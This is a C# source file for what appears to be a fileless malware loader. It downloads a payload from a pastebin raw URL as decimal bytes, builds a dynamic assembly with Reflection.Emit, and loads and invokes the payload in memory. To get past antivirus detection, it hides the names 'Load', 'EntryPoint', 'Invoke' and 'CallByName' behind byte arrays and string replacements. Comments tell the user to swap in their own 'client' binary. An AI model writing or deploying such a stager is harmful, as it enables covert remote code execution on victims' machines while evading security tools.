using Microsoft.VisualBasic;
using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

namespace ConsoleApp10
{
    class Program
    {
        private static ILGenerator gen;

        static void Main(string[] args)
        {
            String[] a;
            
            //replace the link with your client's values here
            // The values should be Decimal, You can use the code down to convert your client to Decimal values
            //=====================================================================================
      //              byte[] array = File.ReadAllBytes(path);
     //   StringBuilder stringBuilder = new StringBuilder();
     //   byte[] array2 = array;
     //   for (int i = 0; i < array2.Length; i++)
     //   {
     //       byte b = array2[i];
    //        stringBuilder.Append(b.ToString() + " ");
     //   }
    //    string contents = stringBuilder.ToString().Remove(stringBuilder.ToString().Length - 1);
            //=====================================================================================

            
            HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create("https://pastebin.com/raw/");
            using (StreamReader reader = new StreamReader(req.GetResponse().GetResponseStream()))
            {
                a = reader.ReadToEnd().Split(' ');
                req.Abort();
            }

            Int32[] BArr = Array.ConvertAll(a, s => Int32.Parse(s));

            AssemblyBuilder AB = AppDomain.CurrentDomain.DefineDynamicAssembly(new AssemblyName("HUMBLE"), AssemblyBuilderAccess.Run);
            ModuleBuilder MB = AB.DefineDynamicModule("HUMBLE");
            TypeBuilder TB = MB.DefineType("HUMBLE", TypeAttributes.Public);
            MethodBuilder MeB = TB.DefineMethod("HUMBLE", MethodAttributes.Public, null, null);
            gen = MeB.GetILGenerator();
            LocalBuilder Arr = gen.DeclareLocal(typeof(Byte[]));
            gen.Emit(OpCodes.Ldc_I4, BArr.Length);
            gen.Emit(OpCodes.Newarr, typeof(Byte));
            gen.Emit(OpCodes.Stloc, 0);

            for (int i = 0; i < BArr.Length; i++)
            {
                gen.Emit(OpCodes.Ldloc, 0);
                gen.Emit(OpCodes.Ldc_I4, i);
                gen.Emit(OpCodes.Ldc_I4, Convert.ToInt32(BArr[i].ToString()));
                gen.Emit(OpCodes.Stelem_I1);
            }

            Emit1();
            Emit2();
            Emit3();
            Type t = TB.CreateType();
            Object o = Activator.CreateInstance(t);
            t.GetMethod("HUMBLE").Invoke(o, null);
        }
        private static void Emitting(OpCode op, MethodInfo mi)
        {
            gen.Emit(op, mi);
        }

        private static void Emitting(OpCode op, String str)
        {
            gen.Emit(op, str);
        }

        private static void Emitting(OpCode op)
        {
            gen.Emit(op);
        }

        private static void Emit1()
        {
            Byte[] GetCurDom = { 0x67, 0x65, 0x74, 0x5F, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x44, 0x6F, 0x6D, 0x61, 0x69, 0x6E };
            Emitting(OpCodes.Call, typeof(AppDomain).GetMethod(Encoding.Default.GetString(GetCurDom)));
            Emitting(OpCodes.Ldstr, "@oad".Replace("@", "L"));
            Emitting(OpCodes.Ldc_I4_1);
            Emitting(OpCodes.Ldc_I4_1);
            gen.Emit(OpCodes.Newarr, typeof(Object));
            Emitting(OpCodes.Dup);
        }

        private static Type[] TY = new Type[] { typeof(Object), typeof(String), typeof(CallType), typeof(Object[]) };
        private static Byte[] CBN = { 0x43, 0x61, 0x47, 0x47, 0x42, 0x79, 0x4E, 0x61, 0x6D, 0x65 };
        private static MethodInfo Cbn = typeof(Interaction).GetMethod(Encoding.Default.GetString(CBN).Replace("G", "l"), TY);

        private static void Emit2()
        {
            Emitting(OpCodes.Ldc_I4_0);
            Emitting(OpCodes.Ldloc_0);
            Emitting(OpCodes.Stelem_Ref);
            Emitting(OpCodes.Call, Cbn);
            Emitting(OpCodes.Ldstr, "@ntry&oint".Replace("@", "E").Replace("&", "P"));
            Emitting(OpCodes.Ldc_I4_2);
            Emitting(OpCodes.Ldc_I4_0);
        }
        private static void Emit3()
        {
            gen.Emit(OpCodes.Newarr, typeof(Object));
            Emitting(OpCodes.Call, Cbn);
            Emitting(OpCodes.Ldstr, "%nvoke".Replace("%", "I"));
            Emitting(OpCodes.Ldc_I4_1);
            Emitting(OpCodes.Ldc_I4_2);
            gen.Emit(OpCodes.Newarr, typeof(Object));
            Emitting(OpCodes.Call, Cbn);
            Emitting(OpCodes.Pop);
            Emitting(OpCodes.Ret);
        }



    }
}
